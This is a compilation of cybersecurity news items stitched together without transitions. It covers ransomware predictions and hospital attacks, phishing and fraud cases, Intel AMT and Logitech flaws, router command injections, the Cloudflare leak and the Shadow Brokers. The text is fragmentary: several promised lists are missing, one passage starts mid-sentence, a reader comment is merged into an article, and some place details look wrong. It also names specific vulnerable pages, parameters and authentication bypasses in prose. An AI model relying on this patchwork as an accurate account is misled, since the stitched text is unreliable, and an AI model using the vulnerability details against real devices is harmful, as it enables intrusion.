This attack was so potent experts estimate it infected more than 100,000 victims per day at its peak.
More recently, hackers went after the beloved San Francisco Municipal Transport Agency (MUNI).
If you were in the area in late November, you may have gotten the message “You Hacked” at public transit ticket kiosks.
The city’s light rail was hit by ransomware that forced them to offer free rides for two days while they recovered the files.
Or, what about Popcorn, the ingenious little in-development ransomware variant in December that turned victims into attackers by incentivizing them with a pyramid scheme-style discount.
Send the infection to two of your friends, and you get your files back for free.
Ransomware perhaps hit healthcare the hardest in 2016, with some reports claiming 88 percent of all ransomware affected hospitals.
Whether large or small, no provider could hide from hackers looking to nab and encrypt patient data, disrupting care until the provider paid up or recovered files.
The New Jersey Spine Center and Marin Healthcare District were attacked by Cryptowall, which encrypted electronic health records, backup files and the phone system.
MedStar, which operates 10 hospitals in the D.C and Baltimore area, was forced to shut down its entire IT system and revert to paper records.
And the list goes on and on with names like California’s Hollywood Presbyterian Medical Center, The University of Southern California’s Keck and Norris Hospital, Kansas Heart Hospital, Alvarado Medical Center, King’s Daughter’s Health, Chino Valley Medical Center and Desert Valley Hospital, and more.
Criminals have obviously realized the awesome money-making potential of ransomware, and you should expect them to double-down in 2017.
That said, how can they make an already effective threat even more widespread?
Every year I try to predict changes and evolutions to the threat and security landscape.
In this year’s predictions, I forecast that you’ll see the first ever, wide-spread ransomworm.
This new variant will dramatically accelerate the spread of ransomware.
Years ago, network worms like CodeRed, SQL Slammer, and more recently, Conficker were pretty common.
As you probably know, a worm is a type of malware that automatically spreads itself over a network, using either legitimate network file sharing features, or network software vulnerabilities.
In the past, the fastest spreading worms – like the examples mentioned above – exploited network software flaws to automatically propagate through networks (whether the Internet or just your internal network).
Although we haven’t seen many wildly successful network worms lately, they’re still a threat.
All it takes is for one black hat to find a new zero-day networking software flaw and wide-spread ransomworm becomes a real possibility.
In fact, attackers may not even need to know a new networking flaw to create a successful ransomware.
By stealing a computer’s local credentials, attackers can use normal Windows networking, or tools like Powershell to spread through an internal Windows network without leveraging any vulnerability at all.
Now, imagine ransomware attached to such a network worm.
After infecting one victim, it could tirelessly copy itself to every computer it could reach on your local network.
Whether or not you want to imagine such a scenario, criminals have already added network-scanning capabilities to some ransomware variants, and there’s a high likelihood they will more aggressively merge ransomware and worm capabilities next year.
In 2017, I suspect you’ll see a ransomworm that automatically spreads very quickly and successfully, at least on local networks, if not the Internet.
Since falling victim to ransomware can be a costly and time-consuming affair, how can you prepare to combat these evolving threats?
Backup – Sure, I know most people just want to prevent ransomware, but you’ll never have 100 percent assurances of that in information security.
Backing up your data is an important part of security for reasons far beyond just recovering from a ransomware attack.
If you don’t already backup your important data, ransomware is the best reason yet to do so.
Patch your software – There are many ways ransomware might get on your systems, including just users manually doing foolish things.
However, in order to forcefully or automatically install malware on your system, attackers must exploit software flaws.
That said, vendors have already fixed a huge percent of the vulnerabilities hackers use to spread malware.
If you simply keep your patches up to date, you won’t succumb to many of these forced or automated attacks, which could even help against ransomworms, assuming the network flaw they used was also patched.
Implement Killchain Defense – You won’t find one security technology that can protect you from 100 percent of ransomware by itself.
However, there are many security controls that help protect you from various stages of a ransomware attack.
For instance, Intrusion Prevention Systems (IPS) can prevent some of the exploits criminals use to spread ransomware.
AntiVirus can catch some of the most common ransomware variants, and more modern advanced threat protection solutions can even identify and block new zero-day ransomware samples.
However, none of these defenses are fool proof alone.
The best way to protect your computer or organization is to combine all of them.
Unified Threat Management (UTM) solutions often offer the easiest option for placing all these protections under one pane of glass.

The targeted server secure2.donaldjtrump.com was defaced Sunday evening when Ars Technica noted that the home page for the server was displaying a deface page along with a message left by a defacer from Iraq.
The deface message was simple than expected since Iraq is among those seven countries whose citizens have been banned by Trump from entering the United States.
According to the message:
Where's Rudy 'Cyber' Giuliani when you need him?
Trump’s hotels have also been targeted several times in the last couple of years starting from a credit card breach incident where personal and financial information of guests were stolen.
However, it should not surprise the readers since Trump is still using an old Android phone to Tweet from his official account and one of the congressmen has already requested an investigation on the use of an old phone since Android is one of the most vulnerable and targeted mobile operating systems in the world.

When it comes to fixing security vulnerabilities, it should be clear by now that words only count when they’re swiftly followed by actions.
Ask peripherals maker Logitech, which last week became the latest company to find itself on the receiving end of an embarrassing public flaw disclosure by Google’s Project Zero team.
In September, Project Zero researcher Tavis Ormandy installed Logitech’s Options application for Windows (available separately for Mac), used to customise buttons on the company’s keyboards, mice, and touchpads.
Pretty quickly, he noticed some problems with the application’s design, starting with the fact that it…
   opens a websocket server on port 10134 that any website can connect to, and has no origin checking at all.
Websockets simplify the communication between a client and a server and, unlike HTTP, make it possible for servers to send data to clients without first being asked to, which creates additional security risks.
    The only “authentication” is that you have to provide a pid [process ID] of a process owned by your user, but you get unlimited guesses so you can bruteforce it in microseconds.
Ormandy claimed this might offer attackers a way of executing keystroke injection to take control of a Windows PC running the software.
Within days of contacting Logitech, Ormandy says he had a meeting to discuss the vulnerability with its engineers on 18 September, who assured him they understood the problem.
A new version of Options appeared on 1 October without a fix, although in fairness to Logitech that was probably too soon for any patch for Ormandy’s vulnerability to be included. As anyone who’s followed Google’s Project Zero will know, it operates a strict 90-day deadline for a company to fix vulnerabilities disclosed to it, after which they are made public.
    I would recommend disabling Logitech Options until an update is available.
Clearly, the disclosure got things moving – on 13 December, Logitech suddenly updated Options to version 7.00.564 (7.00.554 for Mac). The company also tweeted that the flaws had been fixed, confirmed by Ormandy on the same day.
Logitech aren’t the first to feel Project Zero’s guillotine on their neck. Earlier in 2018, Microsoft ran into a similar issue over a vulnerability found by Project Zero in the Edge browser.
Times have changed – vendors have to move from learning about a bug to releasing a fix much more rapidly than they used to.

Bitdefender researchers have unearthed a previously unknown malware framework that, unlike those used by most APTs, contains many legitimate utilities.
Dubbed Netrepser, the framework is used to find and exfiltrate all kinds of information from compromised Windows systems. The researchers believe that it is wielded by a dedicated cyber espionage group, as the victims are mostly computer systems of government agencies.
Netrepser is usually delivered via spear-phishing emails spoofed to look like they are coming from a legitimate source. The email purports to deliver a document containing guidelines for discussion or a similar benign DOC file, and the recipient is urged to enable macros in order to view the contents of the file:
But doing that will allow the embedded Visual Basic macro to drop a JavaScript file (JS) or a JScript Encoded File (JSE). 
This JS/JSE payload contacts the C&C server, send basic information about the compromised system, and fetches and executes malicious jobs with the help of legitimate tools and malware downloaded directly from it.
It uses, among other things: 
All of these tools are packed with a custom file-packing algorithm that seems unique to this group, but that doesn’t tell us who are these hackers.
“Even though the Netrepser malware uses free tools and utilities to carry various jobs to completion, the technical complexity of the attack, as well as the targets attacked, suggest that Netrepser is more than a commercial-grade tool,” the researchers noted.
“Because of the nature of these attacks, attribution is impossible unless we dig into the realm of speculation. Our technical analysis however, has revealed that some documents and file paths this campaign is using are written in Cyrillic.”
Technical details and indicators of compromise tied to this campaign can be found here.

It’s tax season, and that means con artists and scammers are out in full force trying to capitalize on people’s financial anxieties.
The IRS puts out strong warnings each year—often republishing its “’Dirty Dozen’ list of tax scams” several times between January and April. This year, phishing schemes—in which scammers send emails pretending to be from the IRS in order to trick people into divulging sensitive information—topped the list.
“We urge taxpayers to watch out for these tricky and dangerous schemes,” acting IRS Commissioner David Kautter said in a March 5 warning to consumers. “Phishing and other scams on the ‘Dirty Dozen’ list can trap unsuspecting taxpayers. Being cautious and taking basic security steps can help protect people and their sensitive tax and financial data.”
Threat researchers at Zscaler published a blog on March 15 outlining four new phishing schemes they identified during this tax season, most of which used fake IRS websites to steal taxpayers’ information.
“Cybercriminals have long used social engineering and phishing techniques to lure unsuspecting users into giving away private information,” the researchers wrote. “They track current trends and events to make their attacks more effective, and tax season offers a rich opportunity for attackers to disguise themselves as well-known brands and even government agencies in an effort to exploit users.”
This tendency is on display with the “chalbhai” phishing attack, which uses a spoof of an outdated IRS form to trick users into giving up their tax identification information, which can then be used to file false returns. While studying this campaign, researchers noticed the term “chalbhai” used in the source code.
“We have typically seen this tag associated with phishing pages that look like Microsoft Office 365, Apple ID, Dropbox or DocuSign,” Zscaler wrote. “This is a good example of criminals adapting their phishing content to reflect current trends,” i.e., tax season.
Another similar scheme directed users to a fake IRS page for unlocking expired passwords. Researchers noted this campaign was particularly tricky, as users were redirected to a legitimate IRS page after giving up their information.
“With this page,” they wrote, “the attacker is attempting to prevent user suspicion by redirecting the user from this phishing page to a legitimate e-policy statement hosted on the actual IRS page… At this point, the victims believe they have completed the account unlock process and they proceed to log in on the legitimate page unaware that their information has been stolen.”
Researchers also found similar tactics used to get taxpayers’ logins for tax preparer sites like TurboTax.
In a fourth example, Zscaler researchers found an encrypted phishing page designed to mask their ill-intent from security measures. After a user downloads the page, it is decrypted within the browser, skirting some security checks.
In all these examples, users could have avoided the scam by double-checking the URL in the browser, which all included additional characters before the .gov domain, indicating users were not actually at an official IRS site.

A security lapse at content distribution network provider Cloudflare that resulted in customer data being leaked publicly for several months was bad - but had the potential to be much worse.
That's Cloudflare's initial postmortem conclusion after a twelve-day review of log data related to the breach.
The review showed no evidence that attackers had exploited the flaw prior to it being discovered and patched, Cloudflare CEO and founder Matthew Prince said in a blog Wednesday.
A ""vast majority"" of Cloudflare's customers also did not appear to have had any of their data leaked.
Cloudflare’s inspection of tens of thousands of pages that were leaked from its reverse-proxy servers and cached by search engines revealed a ""large number"" of instances of internal Cloudflare cookies and headers.
But so far, according to Prince, there’s no evidence that passwords, credit card numbers, and other personal data were compromised as was initially feared.
The Cloudflare security snafu stemmed from the manner in which a stream parser application that the company uses to modify content passing through its edge servers handled HTTP requests.
The bug caused the parser to read memory not only from the HTML page that was being actually parsed, but also from adjacent memory that contained data in response to HTTP requests made by other customers.
The flaw was triggered only when pages with certain specific attributes were requested through Cloudflare’s CDN.
""If you had accessed one of the pages that triggered the bug you would have seen what likely looked like random text at the end of the page,"" Prince said.
A lot of the leaked data ended up getting cached by search engines and Web scrapers.
A security researcher from Google’s Project Zero threat hunting team alerted Cloudfare to the bug last month.
The company claimed it fixed the problem in a matter of hours after being notified of the problem.
Some have compared the breach to Heartbleed and have even called it Cloudbleed.
In his blog, Prince compared the threat posed by the bug to that posed by a stranger eavesdropping on a random conversation between two employees.
Most of the time, the stranger would likely hear nothing of value, but occasionally might pick up something confidential.
The same would have been true for a malicious attacker, who had somehow known about the bug and exploited it before Cloudflare’s fix, he said.
The customers most at risk of having their data exposed were those that sent the most requests through Cloudflare’s CDN.
Cloudflare’s detailed postmortem and mea culpa evoked a mixed response from security experts.
Ilia Kolochenko, CEO of Web security firm High-Tech Bridge praised Prince’s effort to be transparent about what went down.
""Even if we cannot verify the accuracy of all the numbers inside – for the moment, I don’t have a valid reason to question either its content, or conclusion,"" Kolochenko says.
In fact, until someone can come up with a credible rebuttal of Cloudflare’s internal investigation, it’s inappropriate to compare what happened at the company to Heartbleed.
""I’d say it’s inappropriate even to call this particular incident a 'Cloudbleed,'"" he says.
""In the Heartbleed case, almost every company in the world, many software vendors including cybersecurity companies, were seriously impacted by the vulnerability.""
Heartbleed also resulted in multiple breaches and many organizations continue to be exposed to the threat.
Neither of those situations applies to the Cloudflare security lapse.
""All avenues of Cloudflare’s vulnerability exploitation seems to be mitigated by now,"" he says.
But Kunal Anand, CTO of application security vendor Prevoty, says the details Cloudflare has shared aren't exactly reassuring.
If no sensitive information like credit numbers and Social Security Numbers were leaked and the leaked dataset itself was relatively small, there is no reason why Cloudflare shouldn't share it with a third-party for an unbiased review, he says.
""CloudFlare needs to realize that HTTP headers, including cookies, contain sensitive information like session identifiers, authorization tokens and IP addresses,"" Anand says.
""All of these data points should count as private data.""
CloudFlare has been working with various search engines to purge their caches, but in the process, any evidence of the data that was leaked is being deleted as well.
That makes it hard to quantify the scope of the data breach outside of CloudFlare's own logs.
""There's a lot of speculation if nation-state sponsored engines will actually purge the data or copy it for further analysis,"" Anand says.

East Ohio Regional Hospital in Harper's Ferry, Ohio, and Ohio Valley Medical Center in Wheeling, West Virginia, both got affected by ransomware on the last weekend of November.[1] Due to this incident, ambulance patients were transported to other hospitals nearby and emergency room admissions were limited to walk-up patients only. 
Due to attack, employees needed to switch to paper charting and various systems were taken offline immediately. This fairly quick response limited the ransomware damage and prevented the possible data breach.[2] According to Karin Janiszewski, director of marketing and public relations for EORH and OVMC, hospitals reacted as soon as possible and, at the moment of writing, they are already using the computer network.
On the following Saturday, Karin Janiszewski stated:
    There has been no patient information breach. The hospitals are switching to paper charting to ensure patient data protection. We have redundant security, so the attack was able to get through the first layer but not the second layer.
IT staff dealt with the outbreak to avoid a data breach
When it comes to malware attacks on large companies, the loss of personal customer data is the worst thing that can happen. It seems that this time the situation was handled quick enough to prevent having the sensitive data being compromised. 
IT team took several computers offline, and, because of this, most of the clinical operations transferred to other units, and emergency patients were automatically taken to different locations. On Saturday, when the incidents occurred, hospital officials stated that the staff is ready to take everything on paper until the downtime is over.
Also, since this is a ransomware-type malware attack, hackers demand a ransom. However, officials did not select the scenario involving making the payment. No matter how big or how little the ransom demand is, officials shouldn't even consider making the payment because it may lead to system damage or permanent data loss.[3]
In the United States, data breaches and malware attacks on huge organizations have become a common thing, especially in the healthcare industry. In 2016 Hollywood Presbyterian Hospital paid the demanded ransom in Bitcoin after having its data encrypted.[4] The infection was widespread and the attack cost around $17 000.
Another incident that resulted in ransom payment was spotted in Kansas Heart Hospital in 2016 also. Unfortunately, after the payment was made, attackers disappeared ignoring the promise to decrypt locked files. They send yet another ransom demand instead and asked for a bigger amount of money. 
Previously this year, the Indiana-based hospital got infected with SamSam which is an infamous ransomware virus which has been relying on specific infection tactics which is highly personalized. After considering different scenarios, the hospital decided to pay 4 BTC (equal to $45 000 at that time) for ransomware developers to get private keys needed for files' recovery. Ransomware developers gave what they promised.

A security vulnerability in Intel Corp. chips first disclosed last week looks far worse than initially thought, as hackers can hijack Intel processors without even needing a password.
The vulnerability, which affects all Intel chips manufactured since 2008, from those code-named Nahalem to today’s Kaby Lake, stems from a flaw in vPro firmware suite including Intel Active Management Technology from versions 6 to 11.6. The security hole allows an unprivileged attacker to gain control of the manageability features provided by the firmware suite, giving a would-be hacker the same access that a systems administrator would have, including the ability to change boot up code and access the computer’s mouse, keyboard, monitor and programs installed.
Intel argued that access to the vulnerability was fairly limited, in that a password was required to access AMT. But Tenable Network Security Inc. has discovered that the verification process for AMT accepts a blank password submission.
As Rick Falkvinge at Private Internet Access explains:
In order to get administrator privileges to the server memory, all you needed to do was to submit a blank password field instead of the expected privileged-access password hash, and you would have unlimited and unlogged read/write access to the entire server memory.
With the ability to gain access to an Intel central processing unit as simple as submitting no password, experts are warning that the worst should be presumed.
“If you have anything connected to the Internet with AMT on, disable it now. Assume the server has already been compromised,” SSH inventor Tatu Ylonen said in a blog post. “The exploit is trivial, a maximum of five lines of Python, and could be doable in a one-line shell command.”
He said the flaw gives full control of affected machines, including the ability to read and modify everything. “It can be used to install persistent malware – possibly in the firmware – and read and modify any data.
Ylonen recommended that AMT be disabled today and that affected users “mobilize whomever you need.” More specifically, he said, “start from the most critical servers: Active Directory, certificate authorities, critical databases, code signing servers, firewalls, security servers, HSMs (if they have it enabled).” Data center operators should “block ports 16992, 16993, 16994, 16995, 623, 664 in internal firewalls” if they can.

Chrome users have lately been targeted with a few unusual malware delivery and scam attempts.
The first one comes from compromised WordPress sites that have been modified to include JavaScript that changes the text rendering.

“The usage of a a clean, well-formatted dialog to present the message with the correct Chrome logo – and, more importantly, – the correct shade of blue for the update button.
The shape of the update button seems correct, and the spelling and grammar are definitely good enough to get a pass,” NeoSmart Technologies’ Mahmoud Al-Qudsi noted.
wrong version numbers) during the download and installation process, but not all will.
The bad news is that Windows Defender or Chrome don’t flag the file as malware and, at the time of the initial discovery, very few AV engines detected it as malicious (the situation is much better now).
Chrome will tell users that “this file isn’t downloaded very often” as a warning of its potential malicious nature, but that’s unlikely to stop users who are accustomed to click through security warnings.
The second threat comes in the form of a malicious Chrome extension that is pushed onto visitors of compromised sites.
The potential victims are redirected to such sites mostly through malvertising schemes, and they are faced with the request to install the extension in order to be able to leave the site – no other option is given, and the browser is stuck in a never ending loop of fullscreen modes.
The extension aims to redirect victims to unwanted software, get-rich-quick schemes, and various scams.
“This extension ensures it stays in hiding by using a 1×1 pixel image as its logo and by hooking chrome://extensions and chrome://settings such that any attempt to access those is automatically redirected to chrome://apps.
That makes it much more difficult for the average user to see what extensions they have, let alone uninstalling one of them,” Malwarebytes’ Jérôme Segura explains.
Victims will have to use a security solution to do it, and likely another browser to search for it and install it.
Malwarebytes detects this extension as Rogue.ForcedExtension.

In March 2014, Boston Children’s Hospital learned the worst possible security news—from a third-party vendor with no formal relationship to the facility.
That vendor told the pediatric facility that it had seen online documents threatening the hospital, as well as posted documents with information on physicians such as cell phone numbers, addresses and work locations.
And the information also included details of Boston Children’s infrastructure, such as the main IP address of its organizational web site.
Any kid could find this stuff easily online, but it was clear someone was trying to damage the reputation of Boston Children’s, said Daniel Nigrin, MD, senior vice president and CIO in the division of endocrinology, during the Cybersecurity Forum at HIMSS17.
Then came a video from the activist hacking organization Anonymous, accusing the hospital of having tortured a child.
“I’ve been a CISO for 16 years; this was a new one me,” Nigrin recalled.
In particular, the charge from Anonymous centered on a teenage girl that the hospital determined was suffering from malnutrition.
The case went to court, where a judge’s ruling removed the child from parental custody.
The family fought the decision, and the controversy found its way to Anonymous, which decided that Boston Children’s needed to be taught a lesson.
“We wondered if it was the real Anonymous; thankfully, the decision was to take the threat seriously,” Nigrin said.
The hospital convened an incident response team and starting forming contingency plans for an expected attack, which included “going dark” and cutting itself off from the Internet while assessing the systems and processes still necessary to keep the facility running.
In the meantime, Boston Children’s contacted local police and the FBI, who were reluctant to step in proactively, and told hospital executives to get back to them if anything happened.
Three weeks went by without incident, and the facility was hit with low-value distributed denial of service attacks that were handled.
But then, tactics started to change as attacks increased in volume.
One week later on a Saturday night, the cat-and-mouse game ended with a dramatic uptick in attacks and a third party was engaged to help the hospital defend itself.
The concerted Anonymous cyber attack started April 14 and ended on April 27.
At its peak, the hackers were sending 30-day levels of malicious traffic in very short periods of time.

The email didn’t just seem innocent, it also seemed familiar to the accounts payable employee at MacEwan University in Edmonton. It was from one of the local construction firms the public institution deals with, logo and all. There was new bank account information —could accounts payable please change it?
The staff and this supposed vendor communicated back and forth, from late June until a few weeks ago, in early August. One university employee was involved in this correspondence at first; two more were added.
Then vendor payments went through, as scheduled: $1.9 million from MacEwan accounts on August 10. Another $22,000 were transferred seven days later. Finally, $9.9 million went to this new bank account on August 19, a Saturday.
Wednesday morning, for the first time in this episode, came a phone call. The Edmonton-area vendor wanted to know why it never got its payments.
The massive fraud had already been perpetrated, $11.8 million winding its way into a TD bank account in Montreal and much of it then wired overseas, a university spokesman says. Investigators have traced $11.4 million of the money and frozen the suspect accounts in Quebec and Hong Kong. The school is pursuing civil legal action to recover the money. “The status of the balance of the funds is unknown at the time,” a MacEwan statement said about the other $400,000.
There’s likely not a person reading this online who hasn’t received a phishing attack, in which someone pretending to be a bank sends an email or text message, hoping to trick you into enter or re-enter account information or a credit card number. What hit MacEwan was a spear phishing attack, in which scammers impersonate a client or associate of the individual. In this case, the fraudster had cut-and-pasted the actual vendor’s logo, MacEwan spokesman David Beharry said. A phishing attacker will often cast several lures; in this case, investigators said 14 different Edmonton-area construction sites or firms were impersonated as part of this attempt. The successful trick led to financial transfers equivalent to more than five per cent of the publicly funded school’s 2016 operating budget, according to records.
This inflicted vastly more damage than the last well-documented online scam to successfully target an Alberta post-secondary school: last year, University of Calgary paid $20,000 in what’s known as a ransomware attack, in which cyberattackers manage to lock or encrypt network data until the victim pays up. While MacEwan is confident it can recoup the amounts already frozen, it will also incur legal fees on three continents as it tries to do so, Beharry says.
Edmonton’s second-largest university knew enough about this problem to launch its own phishing awareness campaign last school year for staff and students, posters and all. Now, the school itself will become a cautionary tale about the perils and pratfalls of spear phishing cyberattacks.
With this ugly incident, MacEwan University becomes a cautionary tale of another sort: financial controls. These were not high-level employees ensnared by this phishing attack, the school spokesman says, though he did not identify them or clarify how the three employees were involved. From now on, one fraud and $11.8 million later, such vendor banking information changes will need to go through a second and third level of approval at MacEwan before the final clicks or keystrokes occur.

An unknown number of managed service providers and their customers are victims of a massive, global cyber espionage campaign by a China-based threat actor that this week was also fingered in another attack against a U.S. group involved in lobbying around foreign trade policy.
News of the campaigns coincides with Chinese President Xi Jinping’s first official visit to the U.S. to meet with President Trump.
It suggests that cyber-enabled espionage out of China continues to be an issue, despite a September 2015 agreement between the U.S and Chinese governments not to support or engage in such activities.
“Even as IP-focused cyber-espionage has reduced since the Xi Jinping-Obama agreement, big business will continue to be targeted, if nothing else than for the influence they hold over governments,” warns Hardik Modi, vice president of threat research at Fidelis Cybersecurity.
Fidelis was one of the organizations that this week disclosed new cyber espionage activity by APT10, a well-known China-based advanced threat group that is also known as Stone Panda.
The other warning about the APT10 group's resurgent activity, after a period of relative quiet, came from PwC UK and BAE Systems.
According to Fidelis, its security researchers in February discovered a reconnaissance tool called ""Scanbox,"" previously associated with China government-sponsored threat actors, embedded on specific pages of the NFTC site.
Among the infected page were those that NFTC board members used to register for meetings.
It’s unclear how the APT10 group initially breached the site in order to embed Scanbox on it.
“Scanbox is a robust framework that can include a variety of reconnaissance modules,” Modi says.

Merely a day after rolling out the December 2018 security patch early, Samsung has now revealed the details of the latest security maintenance release. The Galaxy Xcover 4 is the first smartphone to get this update. Samsung will be releasing the patch for more compatible devices in the coming weeks.
It has detailed the contents of this patch as part of its monthly security maintenance release process. The update includes patches from Google for Android in addition to patches from Samsung for its custom software.
The December 2018 security patch has fixes for six critical vulnerabilities discovered in the Android operating system. The most severe vulnerability in the framework section could enable a malicious app to run unapproved code in the context of a privileged process. However, no moderate or low-risk vulnerabilities were required to be patched in this latest security maintenance release.
The update does bring quite a patches for 40 Samsung Vulnerabilities and Exposures (SVE) items. This includes a vulnerability in the Secure Folder app which could have allowed access without authentication. Another vulnerability in the app could have resulted in the exposure of the gallery app without authentication.
Therefore, Samsung will now get down to the business of rolling out the December 2018 security patch to supported devices. We should expect some handsets to start receiving it within the next few days. The company may start rolling it out to high-end devices first.

A security researcher has published details of a vulnerability in a popular cloud storage drive after the company failed to issue security patches for over a year.
Remco Vermeulen found a privilege escalation bug in Western Digital’s My Cloud devices, which he said allows an attacker to bypass the admin password on the drive, gaining “complete control” over the user’s data.
The exploit works because drive’s web-based dashboard doesn’t properly check a user’s credentials before giving a possible attacker access to tools that should require higher levels of access.
The bug was “easy” to exploit, Vermeulen told TechCrunch in an email, and was remotely exploitable if a My Cloud device allows remote access over the internet — which thousands of devices do. He posted a proof-of-concept video on Twitter.
Details of the bug were also independently found by another security team, which released its own exploit code.
Vermeulen reported the bug over a year ago, in April 2017, but said the company stopped responding. Normally, security researchers give 90 days for a company to respond, in line with industry-accepted responsible disclosure guidelines.
After he found that WD updated the My Cloud firmware in the meanwhile without fixing the vulnerability he found, he decided to post his findings.
A year later, WD still hasn’t released a patch.
The company confirmed that it knows of the vulnerability but did not say why it took more than a year to issue a fix. “We are in the process of finalizing a scheduled firmware update that will resolve the reported issue,” a spokesperson said, which will arrive “within a few weeks.”
WD said that several of its My Cloud products are vulnerable — including the EX2, EX4 and Mirror, but not My Cloud Home.
In the meantime, Vermeulen said that there’s no fix and that users have to “just disconnect” the drive altogether if they want to keep their data safe.

TSB is a mysterious group that appeared in the summer of 2016 when they dumped on GitHub and other sites a trove of files they claim to have stolen from the Equation Group, a codename given to a cyber-espionage group many cyber-security experts believe to be the NSA.
In their original announcement, the group dumped a collection of free files so that cyber-security experts can validate the veracity of their claims.
In addition, the group also released a second set of files, which were encrypted with a password the group promised to provide to the winner of online bidding war.
As no one stepped forward, the group started selling some of these tools individually last December but eventually called it quits in January, announcing their retirement just ahead of President Trump's inauguration.
Now, the group is back, and the reason why, according to a post published on their Medium blog, is because of Trump's political moves, which appear to have angered the group.
The reasons, as listed by the Shadow Brokers, are below, in original:
The politically-charged message ends with the password for the rest of the supposed NSA hacking tools they group released last summer.
The first cache of NSA hacking tools contained quite a lot of material, such as zero-day exploits and tools to bypass firewalls (Cisco, Fortinet, Juniper, and TOPSEC), a toolkit to extract VPN keys, backdoors for Linux systems, and several Windows exploits.
This second cache is quite fresh, and security researchers haven't had the time to search it in its entirety.

Details on serious vulnerabilities in a number of routers freely distributed by a major Thai ISP were published on Monday after private disclosures made to the vendors in July went unanswered.
Researcher Pedro Ribeiro of Agile Information Security found accessible admin accounts and command injection vulnerabilities in ZyXel and Billion routers distributed by TrueOnline, Thailand’s largest broadband company.
Ribeiro said he disclosed the vulnerabilities through Beyond Security’s SecuriTeam Secure Disclosure Program, which contacted the affected vendors last July.
Ribeiro published a proof of concept exploit yesterday as well.
Ribeiro told Threatpost he’s unsure whether TrueOnline introduced the vulnerabilities as it adds its own customization to the routers, or whether they came from the respective manufacturers.
A ZyXel representative told Threatpost the router models are no longer supported and would not comment on whether patches were being developed.
A request for comment from Billion was not returned in time for publication.
The commonality between the routers appears to be that they’re all based on the TC3162U system-on-a-chip manufactured by TrendChip.
Affected routers are the ZyXel P660HN-T v1 and P660HN-T v2, and Billion 5200 W-T, currently in distribution to TrueOnline customers.
The TC3162U chips run two different firmware variants, one called “ras” which includes the Allegro RomPage webserver vulnerable to the Misfortne Cookie attacks, and the other called tclinux.
The tclinux variant contains the vulnerabilities found by Ribeiro, in particular several ASP files, he said, are vulnerable to command injection attacks.
He also cautions that they could be also vulnerable to Misfortune Cookie, but he did not investigate this possibility.
“It should be noted that tclinux contains files and configuration settings in other languages (for example in Turkish).
Therefore it is likely that these firmware versions are not specific to TrueOnline, and other ISP customised routers in other countries might also be vulnerable,” Ribeiro said in his advisory.
“It is also possible that other brands and router models that use the tclinux variant are also affected by the command injection vulnerabilities (the default accounts are likely to be TrueOnline specific)”.
In addition to Ribeiro’s proof-of-concept, Metasploit modules are available for three of the vulnerabilities.
Most of the vulnerabilities can be exploited remotely, some without authentication.
“These vulnerabilities are present in the web interface.
The default credentials are part of the firmware deployed by TrueOnline and they are authorized to perform remote access over the WAN,” Ribeiro said.
“Due to time and lab constraints I was unable to test whether these routers expose the web interface over the WAN, but given the credentials, it is likely”.
The ZyXel P660HN-T v1 router is vulnerable to an unauthenticated command injection attack that can be exploited remotely.
Ribeiro said he found the vulnerability in the remote system log forwarding function, specifically in the ViewLog.asp page.
V2 of the same router contains the same vulnerability, but cannot be exploited without authentication, he said.
“Unlike in the P660HN-Tv1, the injection is authenticated and in the logSet.asp page.
However, this router contains a hardcoded supervisor password that can be used to exploit this vulnerability,” Ribeiro said.
“The injection is in the logSet.asp page that sets up remote forwarding of syslog logs, and the parameter vulnerable to injection is the serverIP parameter”.
The Billion 5200W-T is also vulnerable to unauthenticated and authenticated command injection attacks; the vulnerability was found in its adv_remotelog.asp page.
“The Billion 5200W-T router also has several other command injections in its interface, depending on the firmware version, such as an authenticated command injection in tools_time.asp (uiViewSNTPServer parameter),” Ribeiro said.
It should be noted that this router contains several hardcoded administrative accounts that can be used to exploit this vulnerability”.
Ribeiro said default and weak admin credentials were found on the all of the versions and were accessible remotely.
The researcher said it’s unknown whether the routers can be patched remotely.
“Again, given the existence of default credentials that have remote access, it is likely that it is possible to update the firmware remotely,” Ribeiro said.
Most of iBall baton routers in India are also vulnerable to unauthenticated and authenticated command injection attack,i have reason to believe default and weak admin credentials are on the all of the versions and were accessible remotely.
i Have I “Ball WRA150N” ADSL2+ iBall baton Router.And IBall  is  never accepting not even taking response  to complains and request for latest firmware patches.
ASUS patched a bug that allowed attackers to pair two vulnerabilities to gain direct router access and execute commands as root.
Thanks to Meltdown and Spectre, January has already been an extremely busy month of patching for Microsoft.

Digital payments have gained popularity among consumers but have also brought in the threat of cyber criminals placing fake e-wallet apps to dupe users.
According to cyber security solution firm Kaspersky, no such incident has been reported yet but the probability of cyber criminals adding fake apps on app stores remains high.
“Digital payment companies ensure that the transactions are safe on their apps.
Besides, there are checks like two-factor authentication for ensuring secure transactions for consumers,” Altaf Halde, Managing Director at Kaspersky Lab, South Asia, told.
In such a scenario, cyber criminals could look at tricking consumers into downloading fake apps that look almost like the genuine one, allowing a backdoor entry into their smartphone.
While financial institutions like banks and mobile m-wallet companies take steps to protect customer information, users also need to take precautions as negative experiences could lead to losing trust in digital transactions.

For those unfamiliar with the tool, Rsync (remote sync) is commonly used by hosting providers, ISPs, and IT departments to backup data between servers.
The ISP in question, KWIC Internet in Simcoe, Ontario, fixed the Rsync problems after being notified by Salted Hash, but it isn’t clear how long the company’s customers were exposed.
Via email, Vickery shared his latest findings with Salted Hash last week.
[ Learn about top security certifications: Who they're for, what they cost, and which you need.
Initially, Vickery discovered databases belonging to Annex Business Media, a publishing firm with offices in Simcoe and Aurora, Ontario.
One of the exposed Annex databases stood out to him, as it contained the data from the 2015 Ashley Madison data breach.
The other databases contained customer information (names, email addresses, etc.)
Salted Hash reached out to Annex Business Media and asked about the Ashley Madison records, as well as to inform them about the more recent security problems, but the company didn’t respond to questions.
Additional digging led Vickery to discover that Annex was just one part of a larger data breach, one that affected all of KWIC Internet's customers.
“I quickly realized that this one is going to be a real mess for someone to clean up and quite a headache to determine all the affected parties,” Vickery told Salted Hash.
In all, there were terabytes of KWIC data exposed by the breach.
The information inside the leaked databases included credit card details, email addresses, passwords, names, home and business addresses, phone numbers, email backups, VPN details and credentials, internal KWIC backups, and more.
The KWIC archives also included a common PHP shell named r57, and a PHP-based DDoS tool, suggesting that the company had been hacked at some point prior to leaking their backups to the public.
“There are dozens of SQL database backup files and thousands of email backup directories containing everything from internal KWIC staff login credentials to police warrants for ISP subscriber information,” Vickery said.
Other customers exposed by the KWIC data breach include at least one law firm, Norfolk County (norfolkcounty.ca), United Way (unitedwayhn.on.ca), and Greenfield Dental Health Group (greenfielddentistry.ca).
